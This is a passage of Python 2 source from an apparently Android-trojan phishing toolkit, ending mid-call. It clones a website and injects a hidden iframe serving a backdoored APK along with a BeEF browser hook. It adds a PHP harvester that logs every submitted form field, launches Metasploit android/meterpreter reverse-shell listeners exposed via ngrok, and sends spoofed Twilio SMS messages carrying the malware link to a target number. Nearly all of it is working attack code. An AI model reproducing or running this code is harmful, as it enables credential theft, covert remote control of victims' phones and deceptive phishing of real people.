                        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
                        shell=True)
                    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                                          "\n\t[2] Ngrok CustomURL(Business)"
                                          "\n\nroot@unk9vvn:~# ")
                    URL_CLONE = raw_input("\n\t[?] URL CLONE: ")
                    if NGROK_SLT == "1":
                        NoIP = raw_input("\n\t[i] Use IP Public or DNS NoIP."
                                         "\n\t[?] NoIP: ")
                        print "\n"
                        subprocess.call(
                            'proxychains ngrok update && noip2',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
                            shell=True)
                        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
                        for pid in pids:
                            try:
                                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                                if cmd.find('ruby') != -1:
                                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                                    subprocess.call(
                                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                                        shell=True)
                            except IOError:
                                continue
                        subprocess.call(
                            'sed -i \'45s/.*/        dns_host: "' + NoIP + '"/\' /usr/share/beef-xss/config.yaml && '
                            'sed -i \'103s/.*/        db_host: "' + NoIP + '"/\' /usr/share/beef-xss/config.yaml',
                            shell=True)
                        chek_index = os.path.exists('/var/www/html/index.html')
                        if chek_index == (True):
                            subprocess.call(
                                'rm /var/www/html/index.html',
                                shell=True)
                        else:
                            pass
                        subprocess.call(
                            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</body>#<iframe id="frame" src="' + CLS_RN + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + NoIP + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                            shell=True)
                        f = open(atj.protcl, "r")
                        cont = f.read()
                        if cont == "reverse_tcp":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif cont == "reverse_http":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif cont == "reverse_https":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NoIP + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        print "\nI: Please 20 sec waiting...\n"
                        time.sleep(7.0)
                        subprocess.call(
                            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
                            shell=True)
                        time.sleep(10.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        fp = open(atj.ng_url, "r")
                        URL = fp.read()
                        subprocess.call(
                            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
                            shell=True)
                        print "\n"
                        print "I: Start BeEF status..."
                        print "I: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Start Launching status..."
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"

                    elif NGROK_SLT == "2":
                        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                                              "\n\t[?] CustomURL: ")
                        print "\n"
                        subprocess.call(
                            'proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tcp 3000\'',
                            shell=True)
                        chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok_beef.txt')
                        if chek_nngk == (False):
                            pass
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_beef.txt',
                                shell=True)
                        time.sleep(7.0)
                        subprocess.call(
                            'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok_beef.txt',
                            shell=True)
                        fs = open(atj.out9)
                        length = 5
                        LGPORT_BEEF = fs.read(length)
                        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
                        for pid in pids:
                            try:
                                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                                if cmd.find('ruby') != -1:
                                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                                    subprocess.call(
                                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                                        shell=True)
                            except IOError:
                                continue
                        chek_ngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                        if chek_ngk == (True):
                            subprocess.call(
                                'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                                'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
                                shell=True)
                        else:
                            subprocess.call(
                                'sed -i \'45s/.*/        dns_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                                'sed -i \'103s/.*/        db_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml',
                                shell=True)
                        chek_index = os.path.exists('/var/www/html/index.html')
                        if chek_index == (True):
                            subprocess.call(
                                'rm /var/www/html/index.html',
                                shell=True)
                        else:
                            pass
                        subprocess.call(
                            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</body>#<iframe id="frame" src="' + CLS_RN + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                            shell=True)
                        f = open(atj.protcl, "r")
                        METHOD = f.read()
                        if METHOD == "reverse_tcp":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NGHOST + ';set LPORT ' + NGPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif METHOD == "reverse_http":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + NGHOST + ';set LPORT ' + NGPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        elif METHOD == "reverse_https":
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + NGHOST + ';set LPORT ' + NGPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + NGHOST + ';set LPORT ' + NGPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + atj.tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                                shell=True)
                        print "\nI: Please 20 sec waiting...\n"
                        time.sleep(7.0)
                        subprocess.call(
                            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
                            shell=True)
                        time.sleep(10.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        fp = open(atj.ng_url, "r")
                        URL = fp.read()
                        subprocess.call(
                            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
                            shell=True)
                        print "\n"
                        print "I: Start BeEF status..."
                        print "I: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Start Launching status..."
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                    else:
                        return NGROK_SLT

                elif CLONE_MTD == "2":
                    subprocess.call(
                        'chmod o+w /var/www/html/',
                        shell=True)
                    subprocess.call(
                        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
                        shell=True)
                    subprocess.call(
                        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
                        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
                        shell=True)
                    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                                          "\n\t[2] Ngrok CustomURL(Business)"
                                          "\n\nroot@unk9vvn:~# ")
                    URL_CLONE = raw_input("\n\t[?] URL CLONE: ")
                    if NGROK_SLT == "1":
                        NoIP = raw_input("\n\t[i] Use IP Public or DNS NoIP."
                                         "\n\t[?] NoIP: ")
                        print "\n"
                        subprocess.call(
                            'noip2 && proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
                            shell=True)
                        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
                        for pid in pids:
                            try:
                                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                                if cmd.find('ruby') != -1:
                                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                                    subprocess.call(
                                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                                        shell=True)
                            except IOError:
                                continue
                        subprocess.call(
                            'sed -i \'45s/.*/        dns_host: "' + NoIP + '"/\' /usr/share/beef-xss/config.yaml && '
                            'sed -i \'103s/.*/        db_host: "' + NoIP + '"/\' /usr/share/beef-xss/config.yaml',
                            shell=True)
                        chek_index = os.path.exists('/var/www/html/index.html')
                        if chek_index == (True):
                            subprocess.call(
                                'rm /var/www/html/index.html',
                                shell=True)
                        else:
                            pass
                        subprocess.call(
                            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</body>#\\n<script src="http://' + NoIP + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'mv /var/www/html/index.html /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + atj.slashkutat + "h:i:s a - Y/m/d" + atj.slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + atj.slashkutat + "]" + atj.bslash1 + "\\\\\\r\\\\\\n" + atj.slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + atj.slashkutat + "\\\\\\r\\\\\\n" + atj.slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
                            shell=True)
                        checklog = os.path.exists('/var/www/html/log.txt')
                        if checklog == (False):
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        print "\nI: Please 30 sec waiting...\n"
                        time.sleep(15.0)
                        subprocess.call(
                            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
                            shell=True)
                        time.sleep(5.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        fp = open(atj.ng_url, "r")
                        URL = fp.read()
                        time.sleep(5.0)
                        subprocess.call(
                            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
                            shell=True)
                        print "\n"
                        print "I: Start BeEF status..."
                        print "I: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Launching status..."
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                        atj.eng_menu(self="")

                    elif NGROK_SLT == "2":
                        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                                              "\n\t[?] CustomURL: ")
                        print "\n"
                        subprocess.call(
                            'proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok tcp 3000\'',
                            shell=True)
                        chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok_beef.txt')
                        if chek_nngk == (False):
                            pass
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_beef.txt',
                                shell=True)
                        time.sleep(7.0)
                        subprocess.call(
                            'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok_beef.txt',
                            shell=True)
                        fs = open(atj.out9)
                        length = 5
                        LGPORT_BEEF = fs.read(length)
                        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
                        for pid in pids:
                            try:
                                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                                if cmd.find('ruby') != -1:
                                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                                    subprocess.call(
                                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                                        shell=True)
                            except IOError:
                                continue
                        chek_ngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                        if chek_ngk == (True):
                            subprocess.call(
                                'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                                'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
                                shell=True)
                        else:
                            subprocess.call(
                                'sed -i \'45s/.*/        dns_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                                'sed -i \'103s/.*/        db_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml',
                                shell=True)
                        chek_index = os.path.exists('/var/www/html/index.html')
                        if chek_index == (True):
                            subprocess.call(
                                'rm /var/www/html/index.html',
                                shell=True)
                        else:
                            pass
                        subprocess.call(
                            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</body>#\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                            shell=True)
                        subprocess.call(
                            'mv /var/www/html/index.html /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + atj.slashkutat + "h:i:s a - Y/m/d" + atj.slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + atj.slashkutat + "]" + atj.bslash1 + "\\\\\\r\\\\\\n" + atj.slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + atj.slashkutat + "\\\\\\r\\\\\\n" + atj.slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
                            shell=True)
                        checklog = os.path.exists('/var/www/html/log.txt')
                        if checklog == (False):
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                                shell=True)
                            subprocess.call(
                                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                                shell=True)
                        print "\nI: Please 30 sec waiting...\n"
                        time.sleep(15.0)
                        subprocess.call(
                            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
                            shell=True)
                        time.sleep(5.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                                shell=True)
                        fp = open(atj.ng_url, "r")
                        URL = fp.read()
                        time.sleep(5.0)
                        subprocess.call(
                            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
                            shell=True)
                        print "\n"
                        print "I: Start BeEF status..."
                        print "I: Start Ngrok status..."
                        print "I: Start Apache2 status..."
                        print "I: Start Msfconsole listing..."
                        print "I: Start Launching status..."
                        print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
                        atj.eng_menu(self="")
                    else:
                        return NGROK_SLT
                else:
                    atj.eng_menu(self="")
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
                atj.eng_menu(self="")

        elif eng == "2":
            chekngk = os.path.exists('/usr/share/AndTroj/twilio_token.txt')
            if chekngk == (True):
                CLONE_MTD = raw_input("\n\t[1] APK Attack"
                                      "\n\t[2] Harvester"
                                      "\n\nroot@unk9vvn:~# ")
                if CLONE_MTD == "1":
                    subprocess.call(
                        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
                        shell=True)
                    subprocess.call(
                        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
                        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
                        shell=True)
                    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                                          "\n\t[2] Ngrok CustomURL(Business)"
                                          "\n\nroot@unk9vvn:~# ")
                    print "\n"
                    if NGROK_SLT == "1":
                        NoIP = raw_input("\n\t[i] Use IP Public or DNS NoIP."
                                         "\n\t[?] NoIP: ")
                        print "\n"
                        SPOOF_NUM = raw_input("\n\n\t[i] Example: +12565734104\n"
                                              "\t[?] Your Number: ")
                        TARGET_NUM = raw_input("\n\t[i] Example: +989381234567\n"
                                               "\t[?] Target Number: ")
                        MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                            "\t[?] Message Content: ")
                        print "\n"
                        subprocess.call(
                            'proxychains ngrok update',
                            shell=True)
                        subprocess.call(
                            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
                            shell=True)
                        subprocess.call(
                            'service apache2 start && cp ' + CLS_RN + '-b.apk /var/www/html/',
                            shell=True)
                        print "\nI: Please 10 sec waiting...\n"
                        time.sleep(10.0)
                        checkng = os.path.exists('/usr/share/AndTroj/tmp/rat_link.txt')
                        if checkng == (False):
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + CLS_RN + '-b.apk > /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                            subprocess.call(
                                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                        else:
                            subprocess.call(
                                'rm /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                            subprocess.call(
                                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + CLS_RN + '-b.apk > /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                            subprocess.call(
                                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                                shell=True)
                        atj.Tor(self="")
                        print "\nI: Please 10 sec waiting...\n"
                        time.sleep(10.0)
                        TWILIO_SID = "/usr/share/AndTroj/twilio_sid.txt"
                        READ_SID = open(TWILIO_SID, "r")
                        TWIL_SID = READ_SID.read()
                        TWILIO_TOKEN = "/usr/share/AndTroj/twilio_token.txt"
                        READ_TOKEN = open(TWILIO_TOKEN, "r")
                        TWIL_TOKEN = READ_TOKEN.read()
                        RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
                        READ_RAT = open(RAT_LINK, "r")
                        RAT_LNK = READ_RAT.read()
                        account_sid = '{0}'.format(TWIL_SID)
                        auth_token = '{0}'.format(TWIL_TOKEN)
                        client = Client(account_sid, auth_token)
                        message = client.messages.create(
                            from_='' + SPOOF_NUM + '',
                            body='' + MESSAGE + '\n' + RAT_LNK + '',
